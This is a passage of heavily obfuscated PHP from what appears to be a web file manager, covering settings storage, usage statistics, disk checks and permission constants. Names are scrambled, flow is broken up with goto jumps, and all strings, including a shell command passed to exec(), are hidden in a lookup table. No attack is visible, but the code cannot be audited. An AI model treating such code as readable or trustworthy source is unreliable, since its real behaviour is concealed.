json_decode($eòíó¬Æî¿[$bÈ‚æ¹ïé], !0); } } $this->cacheSet($Aßç”„š™, $eòíó¬Æî¿); return $F“Õ½Ôø± ? $eòíó¬Æî¿[$F“Õ½Ôø±] : $eòíó¬Æî¿; goto d±¾¹‹Ñæ; d±¾¹‹Ñæ: } public function set($AÎÀ”ÓØ“æ, $dÒ¥ÜŒÀÇİ = false, $F½ÕôëØËÇ = '') { $dµ»¡²¶ =& $_SERVER[÷ÖêïÔÔÓ]; $this->cacheRemove($F½ÕôëØËÇ); $eÌÖµŒ©Ìœ = array(); $cõâš¼àÃÑ = is_array($AÎÀ”ÓØ“æ) ? $AÎÀ”ÓØ“æ : array($AÎÀ”ÓØ“æ => $dÒ¥ÜŒÀÇİ); foreach ($cõâš¼àÃÑ as $AÎÀ”ÓØ“æ => $eøÒé à„‰) { if (is_array($eøÒé à„‰)) { $eøÒé à„‰ = json_encode_force($eøÒé à„‰); } $this->checkLength($eøÒé à„‰); $eøÒé à„‰ = self::textEncode($eøÒé à„‰); $cõâš¼àÃÑ = array($dµ»¡²¶[29] => $F½ÕôëØËÇ, $dµ»¡²¶[88] => $AÎÀ”ÓØ“æ, $dµ»¡²¶[354] => $eøÒé à„‰); $eÌÖµŒ©Ìœ[] = $this->filterWhere($cõâš¼àÃÑ); } return $this->addAll($eÌÖµŒ©Ìœ, array(), !0); } public function setDeep($a“Œå×Ô®ì, $CÍªáóğŒ = false, $a©Øà‰Öó» = '') { $F‹ËØİ–Ûƒ = explode($_SERVER[÷ÖêïÔÔÓ][92], $a“Œå×Ô®ì); $AÏ“£ëƒ¤Î = $this->get(); array_set_value($AÏ“£ëƒ¤Î, $a“Œå×Ô®ì, $CÍªáóğŒ); $this->set($F‹ËØİ–Ûƒ[0], $AÏ“£ëƒ¤Î[$F‹ËØİ–Ûƒ[0]], $a©Øà‰Öó»); } public function remove($d÷Úå’ğÚ³, $AÀŒƒÙ½ = '') { $e‰™ËÓø’¼ =& $_SERVER[÷ÖêïÔÔÓ]; $this->CacheRemove($AÀŒƒÙ½); $fâè•«–Ô‰ = $this->filterWhere(array($e‰™ËÓø’¼[88] => $d÷Úå’ğÚ³, $e‰™ËÓø’¼[29] => $AÀŒƒÙ½)); if (is_null($d÷Úå’ğÚ³)) { unset($fâè•«–Ô‰[$e‰™ËÓø’¼[88]]); } return $this->where($fâè•«–Ô‰)->delete(); } public function cacheSet($Dâ¨ê§™ó, $AõœµÂø¯¥ = false) { return Cache::set($this->cacheKey($Dâ¨ê§™ó), $AõœµÂø¯¥); } public function cacheGet($e“½óµéå„) { return Cache::get($this->cacheKey($e“½óµéå„)); } public function cacheRemove($bâö¤È†—) { return Cache::remove($this->cacheKey($bâö¤È†—)); } protected function filterWhere($cÕ¼„ƒ²šƒ) { return $cÕ¼„ƒ²šƒ; } protected function cacheKey($EêÔŒİ£ŞÎ) { return $EêÔŒİ£ŞÎ; } } goto aç½ÃÑ¹‡; eˆœÆÊˆ°à: class AnalysisModel extends ModelBaseLight { public function init($D¬®¸„ÌåÉ) { $BŒ„ãÂ¢ãÛ =& $_SERVER[÷ÖêïÔÔÓ]; $D™—ª›¬‡™ = array($BŒ„ãÂ¢ãÛ[527] => array($BŒ„ãÂ¢ãÛ[29] => $BŒ„ãÂ¢ãÛ[1931], $BŒ„ãÂ¢ãÛ[258] => array($BŒ„ãÂ¢ãÛ[207], $BŒ„ãÂ¢ãÛ[686], $BŒ„ãÂ¢ãÛ[1932], $BŒ„ãÂ¢ãÛ[1933])), $BŒ„ãÂ¢ãÛ[1934] => array($BŒ„ãÂ¢ãÛ[29] => $BŒ„ãÂ¢ãÛ[1935], $BŒ„ãÂ¢ãÛ[258] => array($BŒ„ãÂ¢ãÛ[207], $BŒ„ãÂ¢ãÛ[684], $BŒ„ãÂ¢ãÛ[1936], $BŒ„ãÂ¢ãÛ[1937], $BŒ„ãÂ¢ãÛ[1938]))); if (!isset($D™—ª›¬‡™[$D¬®¸„ÌåÉ])) { return !1; } $this->optionType = $D™—ª›¬‡™[$D¬®¸„ÌåÉ][$BŒ„ãÂ¢ãÛ[29]]; $this->field = $D™—ª›¬‡™[$D¬®¸„ÌåÉ][$BŒ„ãÂ¢ãÛ[258]]; return !0; } public function listData($D‹ñèÎ¦Ö = false, $Bõ˜Ğ£µ† = "\x6d\157\x64\x69\146\171\124\x69\x6d\145", $EÌìğ…ì†´ = false) { return parent::listData($D‹ñèÎ¦Ö, $Bõ˜Ğ£µ†, $EÌìğ…ì†´); } public function trendList($Eå½¡£Úáó) { goto e½¡»¢‚Ğí; f£›ÖŞ¬àç: if (!isset($a»×‹¡‘†³)) { $dË×’¾ÃÙ = $Eå½¡£Úáó == $aìšªˆ¼‘[527] ? $aìšªˆ¼‘[469] : $aìšªˆ¼‘[748]; $a»×‹¡‘†³ = Model($dË×’¾ÃÙ)->min($aìšªˆ¼‘[184]); } $a»Äƒ¡®­¿ = $aìšªˆ¼‘[1941] . ucfirst($Eå½¡£Úáó); $C½÷…ŞÑ¬Ê = $this->dateList($a»×‹¡‘†³); goto a—ÜÊÊ¢æ»; a—ÜÊÊ¢æ»: foreach ($C½÷…ŞÑ¬Ê as $Dï”ë¦à‡Ô) { $this->{$a»Äƒ¡®­¿}($Dï”ë¦à‡Ô); } return $this->listData(); goto b’ğæğÂª¸; e½¡»¢‚Ğí: $aìšªˆ¼‘ =& $_SERVER[÷ÖêïÔÔÓ]; $AÙ„ğÇª = $this->listData(); if ($AÙ„ğÇª) { $cæÁ½«ƒãà = end($AÙ„ğÇª); $Dï”ë¦à‡Ô = date($aìšªˆ¼‘[1939], strtotime($aìšªˆ¼‘[1940])); if ($cæÁ½«ƒãà[$aìšªˆ¼‘[207]] == $Dï”ë¦à‡Ô) { return $AÙ„ğÇª; } $a»×‹¡‘†³ = strtotime($cæÁ½«ƒãà[$aìšªˆ¼‘[207]]); } goto f£›ÖŞ¬àç; b’ğæğÂª¸: } private function dateList($AÎ¡ ù›Ş) { $Eº²áÛØ´Ò =& $_SERVER[÷ÖêïÔÔÓ]; $b·ĞÃãÕëÜ = $AÎ¡ ù›Ş; $A‚ë’”å = strtotime($Eº²áÛØ´Ò[1940]); $a»› = array(); while ($b·ĞÃãÕëÜ <= $A‚ë’”å) { $a»›[] = date($Eº²áÛØ´Ò[1939], $b·ĞÃãÕëÜ); $b·ĞÃãÕëÜ = strtotime($Eº²áÛØ´Ò[1942], $b·ĞÃãÕëÜ); } return $a»›; } public function _recordUser($EİœŒÒõ° = '') { goto d¹•ÛãàÖ; e»›ø‚¬ÔÒ: $bï§Æõğ = Model($aÅÀ¼Âå­[469])->where($a×÷Áš“‘‹)->count($aÅÀ¼Âå­[1341]); $a×÷Áš“‘‹[$aÅÀ¼Âå­[29]] = $aÅÀ¼Âå­[1945]; $E½œŞ« = Model($aÅÀ¼Âå­[1946])->where($a×÷Áš“‘‹)->count($aÅÀ¼Âå­[1947]); goto AŞÏŠïùÈÌ; dÙ–×š©Ïğ: $a×÷Áš“‘‹ = array($aÅÀ¼Âå­[184] => array($aÅÀ¼Âå­[923], $fËİÑ­…ï)); $B‰ğùŸèŸå = Model($aÅÀ¼Âå­[469])->where($a×÷Áš“‘‹)->count($aÅÀ¼Âå­[1341]); $a×÷Áš“‘‹[$aÅÀ¼Âå­[184]] = array($aÅÀ¼Âå­[318], array($aÒ‘·á–ÏŒ, $fËİÑ­…ï)); goto e»›ø‚¬ÔÒ; d¹•ÛãàÖ: $aÅÀ¼Âå­ =& $_SERVER[÷ÖêïÔÔÓ]; $aÒ‘·á–ÏŒ = strtotime(date($aÅÀ¼Âå­[1943], strtotime($EİœŒÒõ°))); $fËİÑ­…ï = strtotime(date($aÅÀ¼Âå­[1944], strtotime($EİœŒÒõ°))); goto dÙ–×š©Ïğ; AŞÏŠïùÈÌ: $b‡¶ñÊÈÅ = array($aÅÀ¼Âå­[207] => $EİœŒÒõ°, $aÅÀ¼Âå­[686] => (int) $B‰ğùŸèŸå, $aÅÀ¼Âå­[1932] => (int) $bï§Æõğ, $aÅÀ¼Âå­[1933] => (int) $E½œŞ«); return $this->insert($b‡¶ñÊÈÅ); goto dàÈÛ³¾³; dàÈÛ³¾³: } public function _recordStore($döÊŞŠğØÀ = '') { goto B¼•ÆÛÑÓØ; B¼•ÆÛÑÓØ: $DòôÅÍì¶Ú =& $_SERVER[÷ÖêïÔÔÓ]; $fÎ¹ßßÚºÒ = strtotime(date($DòôÅÍì¶Ú[1944], strtotime($döÊŞŠğØÀ))); $dõ¡—µ’Æ  = array($DòôÅÍì¶Ú[184] => array($DòôÅÍì¶Ú[923], $fÎ¹ßßÚºÒ)); goto Díí´à²; F§êê§ãºº: $eù½¬‹£ƒç = Model($DòôÅÍì¶Ú[748])->where($dõ¡—µ’Æ )->sum($DòôÅÍì¶Ú[78]); $D™­œÍôÇ = array($DòôÅÍì¶Ú[207] => $döÊŞŠğØÀ, $DòôÅÍì¶Ú[684] => (int) $d²¾öî²‹ó, $DòôÅÍì¶Ú[1936] => (int) $e¶Íã²òê¼, $DòôÅÍì¶Ú[1937] => (int) $a·ÈÎ”øÛÏ, $DòôÅÍì¶Ú[1938] => (int) $eù½¬‹£ƒç); return $this->insert($D™­œÍôÇ); goto eˆá‡‹Ò‡±; Díí´à²: $e¶Íã²òê¼ = Model($DòôÅÍì¶Ú[418])->where($dõ¡—µ’Æ )->sum($DòôÅÍì¶Ú[78]); $dõ¡—µ’Æ [$DòôÅÍì¶Ú[367]] = 0; $d²¾öî²‹ó = Model($DòôÅÍì¶Ú[748])->where($dõ¡—µ’Æ )->sum($DòôÅÍì¶Ú[78]); goto DÇ·®ù§Œ; DÇ·®ù§Œ: $dõ¡—µ’Æ [$DòôÅÍì¶Ú[368]] = 1; $a·ÈÎ”øÛÏ = Model($DòôÅÍì¶Ú[748])->where($dõ¡—µ’Æ )->sum($DòôÅÍì¶Ú[78]); $dõ¡—µ’Æ [$DòôÅÍì¶Ú[368]] = 2; goto F§êê§ãºº; eˆá‡‹Ò‡±: } public function trend($Eäï»—æäÆ, $AÉŸôéøö§) { goto Eƒìß•Ãì‹; BŞœ„‡…Ñõ: if ($eÍíªŠ‡À± && $AÉŸôéøö§ != $fÉËÒî„â[1316]) { $b Øá‚©¾ = $eÍíªŠ‡À±[0][$fÉËÒî„â[207]]; $FæøŒÚØ¶ = $this->validDate($AÉŸôéøö§, $b Øá‚©¾); $a˜åéñŒ·¬ = array(); $f Î¢§§Æ¢ = array_to_keyvalue($eÍíªŠ‡À±, $fÉËÒî„â[207]); foreach ($FæøŒÚØ¶ as $dææñ» Ÿ) { if (isset($f Î¢§§Æ¢[$dææñ» Ÿ])) { $B‚÷ğ®©› = $f Î¢§§Æ¢[$dææñ» Ÿ]; } else { $B‚÷ğ®©› = end($eÍíªŠ‡À±); $B‚÷ğ®©›[$fÉËÒî„â[207]] = $dææñ» Ÿ; if ($Eäï»—æäÆ == $fÉËÒî„â[527]) { $B‚÷ğ®©›[$fÉËÒî„â[1932]] = $B‚÷ğ®©›[$fÉËÒî„â[1933]] = 0; } } $a˜åéñŒ·¬[] = $B‚÷ğ®©›; } $eÍíªŠ‡À± = $a˜åéñŒ·¬; } $bÅÍà¤½š = array($fÉËÒî„â[527] => array($fÉËÒî„â[686] => LNG($fÉËÒî„â[1948]), $fÉËÒî„â[1932] => LNG($fÉËÒî„â[1949]), $fÉËÒî„â[1933] => LNG($fÉËÒî„â[1950])), $fÉËÒî„â[1934] => array($fÉËÒî„â[684] => LNG($fÉËÒî„â[1951]), $fÉËÒî„â[1936] => LNG($fÉËÒî„â[1952]), $fÉËÒî„â[1937] => LNG($fÉËÒî„â[1953]), $fÉËÒî„â[1938] => LNG($fÉËÒî„â[1954]))); $fåÜÁ×å = array($fÉËÒî„â[527] => $fÉËÒî„â[1955], $fÉËÒî„â[1934] => $fÉËÒî„â[78]); goto Dˆ–óçÂÀê; Eƒìß•Ãì‹: $fÉËÒî„â =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->init($Eäï»—æäÆ)) { return !1; } $eÍíªŠ‡À± = $this->trendList($Eäï»—æäÆ); goto BŞœ„‡…Ñõ; Dˆ–óçÂÀê: if (empty($eÍíªŠ‡À±)) { $dææñ» Ÿ = date($fÉËÒî„â[1939], strtotime($fÉËÒî„â[1940])); $BÒó‰ö¹•Ö = array($fÉËÒî„â[207] => $dææñ» Ÿ); foreach ($bÅÍà¤½š[$Eäï»—æäÆ] as $c³”Ô£íÀ => $eê‚ËÊ††·) { $BÒó‰ö¹•Ö[$c³”Ô£íÀ] = 0; } $eÍíªŠ‡À±[] = $BÒó‰ö¹•Ö; } $B­ƒ¶ç é = array(); foreach ($eÍíªŠ‡À± as $eê‚ËÊ††·) { if ($Eäï»—æäÆ == $fÉËÒî„â[1934] && $eê‚ËÊ††·[$fÉËÒî„â[1936]] > $eê‚ËÊ††·[$fÉËÒî„â[684]]) { $eê‚ËÊ††·[$fÉËÒî„â[1936]] = $eê‚ËÊ††·[$fÉËÒî„â[684]]; } foreach ($bÅÍà¤½š[$Eäï»—æäÆ] as $c³”Ô£íÀ => $fÏŸ”÷ø—ê) { $B‚÷ğ®©› = array($fÉËÒî„â[207] => $eê‚ËÊ††·[$fÉËÒî„â[207]], $fÉËÒî„â[1237] => $fÏŸ”÷ø—ê); $B‚÷ğ®©›[$fåÜÁ×å[$Eäï»—æäÆ]] = isset($eê‚ËÊ††·[$c³”Ô£íÀ]) ? $eê‚ËÊ††·[$c³”Ô£íÀ] : 0; $B­ƒ¶ç é[] = $B‚÷ğ®©›; } } goto F‘çÓÎÔê°; F‘çÓÎÔê°: return $B­ƒ¶ç é; goto B¸¦–Ë«ˆ‚; B¸¦–Ë«ˆ‚: } public function validDate($Ağ¬äá‹ÒĞ, $A”‰š²‹ìÉ) { goto a¡„´œöÚ; b†è·Ÿ÷ƒœ: switch ($Ağ¬äá‹ÒĞ) { case $F´Ä„ó‰Şù[1323]: $Aïô£÷Ùåô = mktime(0, 0, 0, date($F´Ä„ó‰Şù[1956]), date($F´Ä„ó‰Şù[1957]) - date($F´Ä„ó‰Şù[1184]) + 7 - 7, date($F´Ä„ó‰Şù[1958])); $A¥‰ÇÂ®ˆØ = 0; do { $C—³§œˆ¦Ş = date($F´Ä„ó‰Şù[1939], $Aïô£÷Ùåô - 3600 * 24 * 7 * $A¥‰ÇÂ®ˆØ); $C£ß™§¿Ş¿[] = $C—³§œˆ¦Ş; $A¥‰ÇÂ®ˆØ++; } while ($A”‰š²‹ìÉ < $C—³§œˆ¦Ş); break; case $F´Ä„ó‰Şù[1321]: $A¥‰ÇÂ®ˆØ = 1; do { $a‚¼†³Ï‘ = date($F´Ä„ó‰Şù[1959], strtotime("\x2d\40{$A¥‰ÇÂ®ˆØ}\x20\x6d\x6f\x6e\x74\x68\x73")); $C£ß™§¿Ş¿[] = $a‚¼†³Ï‘; $A¥‰ÇÂ®ˆØ++; } while ($A”‰š²‹ìÉ < $a‚¼†³Ï‘); break; case $F´Ä„ó‰Şù[1624]: $CÒĞŸæÚ‡ = (int) date($F´Ä„ó‰Şù[1958], strtotime($A”‰š²‹ìÉ)); $DÇ˜Öœš´ = (int) date($F´Ä„ó‰Şù[1958]); if ($CÒĞŸæÚ‡ >= $DÇ˜Öœš´) { break; } for ($CÒĞŸæÚ‡; $CÒĞŸæÚ‡ < $DÇ˜Öœš´; $CÒĞŸæÚ‡++) { $C£ß™§¿Ş¿[] = $CÒĞŸæÚ‡ . $F´Ä„ó‰Şù[1960]; } break; default: break; } if ($A”‰š²‹ìÉ > end($C£ß™§¿Ş¿)) { array_pop($C£ß™§¿Ş¿); } sort($C£ß™§¿Ş¿); goto bÙ…÷³„çæ; bÙ…÷³„çæ: return $C£ß™§¿Ş¿; goto D‰Ã±ïÕ‰…; a¡„´œöÚ: $F´Ä„ó‰Şù =& $_SERVER[÷ÖêïÔÔÓ]; $e«»Î°¿Ä· = date($F´Ä„ó‰Şù[1939], strtotime($F´Ä„ó‰Şù[1940])); $C£ß™§¿Ş¿ = array($e«»Î°¿Ä·); goto b†è·Ÿ÷ƒœ; D‰Ã±ïÕ‰…: } public function listTable($c®á©Ó’±) { $Aå™íÚ‰ˆ® = ucfirst($c®á©Ó’±); return Model($Aå™íÚ‰ˆ®)->listData(); } public function option($D¾ø§ÜƒÛ) { $bÂ¥ŠšÃ´‘ = $_SERVER[÷ÖêïÔÔÓ][1961] . ucfirst($D¾ø§ÜƒÛ); return $this->{$bÂ¥ŠšÃ´‘}(); } private function optionUser() { goto e…ìÔéàƒ“; f¡‰îƒíƒ¿: $Fƒ²ºæ‚õÕ = strtotime($AÙ­Ï‚¢ê¼[1963]); $E¢Ü«†ÊÙ = array($AÙ­Ï‚¢ê¼[1964] => array($AÙ­Ï‚¢ê¼[924], $Fƒ²ºæ‚õÕ)); $b¿›Õë¥Êõ = (int) Model($AÙ­Ï‚¢ê¼[469])->where($E¢Ü«†ÊÙ)->count($AÙ­Ï‚¢ê¼[1341]); goto a¦Ïİá ­ ; a¦Ïİá ­ : if (!$b¿›Õë¥Êõ) { $b¿›Õë¥Êõ = 1; } $Fƒ²ºæ‚õÕ = strtotime(date($AÙ­Ï‚¢ê¼[1943])); $E¢Ü«†ÊÙ = array($AÙ­Ï‚¢ê¼[1964] => array($AÙ­Ï‚¢ê¼[924], $Fƒ²ºæ‚õÕ)); goto B‚Ÿ¸»æ´; e…ìÔéàƒ“: $AÙ­Ï‚¢ê¼ =& $_SERVER[÷ÖêïÔÔÓ]; $CÂ‰ƒõøË½ = Model($AÙ­Ï‚¢ê¼[469])->count($AÙ­Ï‚¢ê¼[1341]); $c½¶åÎËëÔ = Model($AÙ­Ï‚¢ê¼[469])->where($AÙ­Ï‚¢ê¼[1962])->count($AÙ­Ï‚¢ê¼[1341]); goto f¡‰îƒíƒ¿; B‚Ÿ¸»æ´: $FÇ¡£Îº± = Model($AÙ­Ï‚¢ê¼[469])->where($E¢Ü«†ÊÙ)->count($AÙ­Ï‚¢ê¼[1341]); return array($AÙ­Ï‚¢ê¼[681] => (int) $CÂ‰ƒõøË½, $AÙ­Ï‚¢ê¼[1965] => (int) ($CÂ‰ƒõøË½ - $c½¶åÎËëÔ), $AÙ­Ï‚¢ê¼[1966] => (int) $c½¶åÎËëÔ, $AÙ­Ï‚¢ê¼[1967] => (int) $FÇ¡£Îº±, $AÙ­Ï‚¢ê¼[1968] => $b¿›Õë¥Êõ); goto dàòÈ‰‚†è; dàòÈ‰‚†è: } private function optionFile() { goto cÆªç‰¾„; cá«½œ¯Õ: $BÏ¬ãÙ ì = $CƒØÆìËøš[$c”©Ñ¾®”¸[1936]]; $aê£¿µ¸ç– = Model($c”©Ñ¾®”¸[748])->where(array($c”©Ñ¾®”¸[367] => 0))->count($c”©Ñ¾®”¸[366]); $B£„Û¾—¿Ø = array($c”©Ñ¾®”¸[367] => 0, $c”©Ñ¾®”¸[184] => array($c”©Ñ¾®”¸[924], strtotime(date($c”©Ñ¾®”¸[1943])))); goto bš¦±¨‹—‰; cÆªç‰¾„: $c”©Ñ¾®”¸ =& $_SERVER[÷ÖêïÔÔÓ]; $CƒØÆìËøš = $this->sourceSize(); $E©˜ùŠåÉÙ = $CƒØÆìËøš[$c”©Ñ¾®”¸[78]]; goto cá«½œ¯Õ; bš¦±¨‹—‰: $aÎè³õÓç¬ = Model($c”©Ñ¾®”¸[748])->where($B£„Û¾—¿Ø)->sum($c”©Ñ¾®”¸[78]); $cë¼±öÑÍÇ = Model($c”©Ñ¾®”¸[748])->where($B£„Û¾—¿Ø)->count($c”©Ñ¾®”¸[366]); return array($c”©Ñ¾®”¸[684] => $E©˜ùŠåÉÙ, $c”©Ñ¾®”¸[1936] => $BÏ¬ãÙ ì, $c”©Ñ¾®”¸[1969] => $E©˜ùŠåÉÙ - $BÏ¬ãÙ ì, $c”©Ñ¾®”¸[1970] => (int) $aÎè³õÓç¬, $c”©Ñ¾®”¸[686] => (int) $aê£¿µ¸ç–, $c”©Ñ¾®”¸[1971] => (int) $cë¼±öÑÍÇ); goto dÁ†ó‰òÇ; dÁ†ó‰òÇ: } private function optionAccess() { $c¨§ù²äãƒ =& $_SERVER[÷ÖêïÔÔÓ]; return array($c¨§ù²äãƒ[681] => $this->typeLogCnt(), $c¨§ù²äãƒ[90] => $this->typeLogCnt($c¨§ù²äãƒ[90]), $c¨§ù²äãƒ[400] => $this->typeLogCnt($c¨§ù²äãƒ[400]), $c¨§ù²äãƒ[1972] => $this->typeLogCnt($c¨§ù²äãƒ[1972]), $c¨§ù²äãƒ[1973] => $this->typeLogCnt($c¨§ù²äãƒ[1973]), $c¨§ù²äãƒ[527] => $this->typeLogCnt($c¨§ù²äãƒ[33], $c¨§ù²äãƒ[1947])); } private function typeLogCnt($cé¹õÛêÑ¹ = '', $Bï‘öªğ˜© = "\x69\144") { goto a¨¤ï´·Û; fùëÆ­‹ä: return (int) $DÉ•ìø¶Û†; goto c¨­Œ®µ…á; C¢æÄ™Ì¼³: $Eìøğéô‡ = array($f—Ö—Ù‰[184] => array($f—Ö—Ù‰[924], $Eöà¾á™ó)); if ($cé¹õÛêÑ¹) { $Eìøğéô‡[$f—Ö—Ù‰[29]] = array($f—Ö—Ù‰[7], $Cùªˆ¦›¾[$cé¹õÛêÑ¹]); } $DÉ•ìø¶Û† = Model($f—Ö—Ù‰[1946])->where($Eìøğéô‡)->count($Bï‘öªğ˜©); goto fùëÆ­‹ä; a¨¤ï´·Û: $f—Ö—Ù‰ =& $_SERVER[÷ÖêïÔÔÓ]; $Cùªˆ¦›¾ = array($f—Ö—Ù‰[90] => array($f—Ö—Ù‰[1974], $f—Ö—Ù‰[1975]), $f—Ö—Ù‰[400] => array($f—Ö—Ù‰[1976]), $f—Ö—Ù‰[1972] => array($f—Ö—Ù‰[1977], $f—Ö—Ù‰[1978]), $f—Ö—Ù‰[1973] => array($f—Ö—Ù‰[1979], $f—Ö—Ù‰[1980]), $f—Ö—Ù‰[1981] => array($f—Ö—Ù‰[1982], $f—Ö—Ù‰[1983], $f—Ö—Ù‰[1984])); $Eöà¾á™ó = strtotime(date($f—Ö—Ù‰[1943])); goto C¢æÄ™Ì¼³; c¨­Œ®µ…á: } private function optionServer() { goto cšëÉ‘½ê; eÚã“Û÷¯æ: if ($D™å„‡´ œ == $B½ÉÕ¾âç•[720]) { $EÍ©†¬»Âê = explode($B½ÉÕ¾âç•[721], $dÄ†ËÆóÊé[$B½ÉÕ¾âç•[722]]); $D™å„‡´ œ = $EÍ©†¬»Âê[0]; } if ($D™å„‡´ œ == $B½ÉÕ¾âç•[820] || $D™å„‡´ œ == $B½ÉÕ¾âç•[702]) { $BñİÒ­ªª‚ = Model()->db()->query($B½ÉÕ¾âç•[1985]); $f›–İ©›¼ = $BñİÒ­ªª‚[0] && isset($BñİÒ­ªª‚[0][$B½ÉÕ¾âç•[1236]]) ? $BñİÒ­ªª‚[0][$B½ÉÕ¾âç•[1236]] : 0; $D™å„‡´ œ = $B½ÉÕ¾âç•[1986] . ($f›–İ©›¼ ? $B½ÉÕ¾âç•[8] . $f›–İ©›¼ : $B½ÉÕ¾âç•[33]); } $A£ØÑº³› = $GLOBALS[$B½ÉÕ¾âç•[6]][$B½ÉÕ¾âç•[334]][$B½ÉÕ¾âç•[749]]; goto bÅÎÖ¸ãÌ; C÷ÂŠœœË: $cñîÎ•’ = array($B½ÉÕ¾âç•[709] => $F‡šÈ¡ÅàÂ[$B½ÉÕ¾âç•[364]]); $E±öÑµ•ù = Model($B½ÉÕ¾âç•[418])->where($cñîÎ•’)->sum($B½ÉÕ¾âç•[78]); $aå×é¢“¹ = explode($B½ÉÕ¾âç•[50], $_SERVER[$B½ÉÕ¾âç•[136]]); goto aŸµêœğ±; bÅÎÖ¸ãÌ: return array($B½ÉÕ¾âç•[1987] => $fÕ¹òÅŸ¬ç ? $fÕ¹òÅŸ¬ç[$B½ÉÕ¾âç•[1988]] : 0, $B½ÉÕ¾âç•[1989] => $fÕ¹òÅŸ¬ç ? $fÕ¹òÅŸ¬ç[$B½ÉÕ¾âç•[1990]] : 0, $B½ÉÕ¾âç•[1991] => (int) $F‡šÈ¡ÅàÂ[$B½ÉÕ¾âç•[1988]] * 1024 * 1024 * 1024, $B½ÉÕ¾âç•[1992] => (int) $E±öÑµ•ù, $B½ÉÕ¾âç•[1993] => ucfirst($fµÁÉ¢‘ŠÑ), $B½ÉÕ¾âç•[1994] => $B½ÉÕ¾âç•[1995] . PHP_VERSION, $B½ÉÕ¾âç•[1996] => phpBuild64() ? 64 : 32, $B½ÉÕ¾âç•[680] => str_replace($B½ÉÕ¾âç•[1997], $B½ÉÕ¾âç•[900], $D™å„‡´ œ), $B½ÉÕ¾âç•[334] => ucfirst($A£ØÑº³›), $B½ÉÕ¾âç•[28] => $_SERVER[$B½ÉÕ¾âç•[1998]]); goto AÙæ¶¶¤Ê; cšëÉ‘½ê: $B½ÉÕ¾âç• =& $_SERVER[÷ÖêïÔÔÓ]; $fÕ¹òÅŸ¬ç = $this->diskDriver(); $F‡šÈ¡ÅàÂ = KodIO::defaultDriver(); goto C÷ÂŠœœË; aŸµêœğ±: $fµÁÉ¢‘ŠÑ = $aå×é¢“¹[0]; $dÄ†ËÆóÊé = $GLOBALS[$B½ÉÕ¾âç•[6]][$B½ÉÕ¾âç•[17]]; $D™å„‡´ œ = $dÄ†ËÆóÊé[$B½ÉÕ¾âç•[719]]; goto eÚã“Û÷¯æ; AÙæ¶¶¤Ê: } private function diskDriver() { goto cÒÜä•Ø; B•Âê¤˜É: if ($F¥¯Óàµ¦‡) { $F«£‡¡”† = $a¦ÖÇÚœ†’[2001]; if (function_exists($a¦ÖÇÚœ†’[2002])) { exec($a¦ÖÇÚœ†’[2003], $DæĞÄ–Éß«); $F«£‡¡”† = $DæĞÄ–Éß«[1] . $a¦ÖÇÚœ†’[8]; } } if (!file_exists($F«£‡¡”†)) { return; } $c±»èãÔˆ = @disk_total_space($F«£‡¡”†); goto Bêƒ­ÈÈÅç; Bêƒ­ÈÈÅç: $cÁÚ“äñ«› = $c±»èãÔˆ - @disk_free_space($F«£‡¡”†); return array($a¦ÖÇÚœ†’[1988] => $c±»èãÔˆ, $a¦ÖÇÚœ†’[1990] => $cÁÚ“äñ«›); goto CøÕï××ŞÃ; cÒÜä•Ø: $a¦ÖÇÚœ†’ =& $_SERVER[÷ÖêïÔÔÓ]; $F«£‡¡”† = $a¦ÖÇÚœ†’[8]; $F¥¯Óàµ¦‡ = $GLOBALS[$a¦ÖÇÚœ†’[6]][$a¦ÖÇÚœ†’[1999]] == $a¦ÖÇÚœ†’[2000]; goto B•Âê¤˜É; CøÕï××ŞÃ: } public function fileChart($a‹òÑğğİê) { goto Bˆìãã½ò; B’÷×ˆœùÃ: $A„ç¹ë„¬‘ = $this->sourceSize(); $Déø«àÇ = array($DÜèÔä‡ö†[457] => 0, $DÜèÔä‡ö†[368] => 1); $d£…íÚù© = Model($DÜèÔä‡ö†[748])->where($Déø«àÇ)->sum($DÜèÔä‡ö†[78]); goto EÎƒôò—Œî; Bˆìãã½ò: $DÜèÔä‡ö† =& $_SERVER[÷ÖêïÔÔÓ]; if (isset($a‹òÑğğİê[$DÜèÔä‡ö†[1341]])) { return Model($DÜèÔä‡ö†[748])->userFileTypeProfile($a‹òÑğğİê[$DÜèÔä‡ö†[1341]]); } if (isset($a‹òÑğğİê[$DÜèÔä‡ö†[2004]])) { return Model($DÜèÔä‡ö†[748])->groupFileTypeProfile($a‹òÑğğİê[$DÜèÔä‡ö†[2004]]); } goto B’÷×ˆœùÃ; EÎƒôò—Œî: $Déø«àÇ[$DÜèÔä‡ö†[368]] = 2; $E‡‰„¦¥öß = Model($DÜèÔä‡ö†[748])->where($Déø«àÇ)->sum($DÜèÔä‡ö†[78]); return array($DÜèÔä‡ö†[684] => $A„ç¹ë„¬‘[$DÜèÔä‡ö†[78]], $DÜèÔä‡ö†[1936] => $A„ç¹ë„¬‘[$DÜèÔä‡ö†[1936]], $DÜèÔä‡ö†[1937] => (int) $d£…íÚù©, $DÜèÔä‡ö†[1938] => (int) $E‡‰„¦¥öß); goto BÕù´óËÕ£; BÕù´óËÕ£: } private function sourceSize() { $bÂ…‘Ñ† ñ =& $_SERVER[÷ÖêïÔÔÓ]; $A«êñğÑù = Model($bÂ…‘Ñ† ñ[748])->where(array($bÂ…‘Ñ† ñ[367] => 0))->sum($bÂ…‘Ñ† ñ[78]); $dåÕõÄ¬«ë = Model($bÂ…‘Ñ† ñ[418])->sum($bÂ…‘Ñ† ñ[78]); if ($dåÕõÄ¬«ë > $A«êñğÑù) { $dåÕõÄ¬«ë = $A«êñğÑù; } return array($bÂ…‘Ñ† ñ[78] => (int) $A«êñğÑù, $bÂ…‘Ñ† ñ[1936] => (int) $dåÕõÄ¬«ë); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $D”µÛÁÕ =& $_SERVER[÷ÖêïÔÔÓ]; $CÑ°„¬•Œ = array(array($D”µÛÁÕ[383] => LNG($D”µÛÁÕ[2005]), $D”µÛÁÕ[2006] => $D”µÛÁÕ[2007], $D”µÛÁÕ[2008] => 6, $D”µÛÁÕ[2009] => 1, $D”µÛÁÕ[2010] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | 